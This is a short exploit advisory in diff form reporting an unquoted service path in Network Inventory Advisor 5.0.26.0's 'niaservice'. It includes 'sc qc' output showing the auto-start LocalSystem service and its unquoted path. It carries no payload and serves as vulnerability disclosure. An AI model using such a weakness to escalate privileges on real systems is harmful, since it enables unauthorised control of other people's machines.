@@ -1,0 +1,25 @@
+# Exploit Title: Network Inventory Advisor 5.0.26.0 - 'niaservice' Unquoted Service Path
+# Date: 2019-11-04
+# Exploit Author: Samuel DiazL
+# Vendor Homepage: https://www.network-inventory-advisor.com/
+# Software Link: https://www.network-inventory-advisor.com/download.html
+# Version: 5.0.26.0
+# Tested on: Microsoft Windows 10 Enterprise x64 ESP
+# CVE: N/A
+
+# Description:
+# Network Inventory Advisor installs niaservice as a service with an unquoted service path
+
+C:\Users\SD502812>sc qc niaservice
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: niaservice
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 0   IGNORE
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\ClearApps\Network Inventory Advisor\niaservice.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Network Inventory Advisor Service by ClearApps Software
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
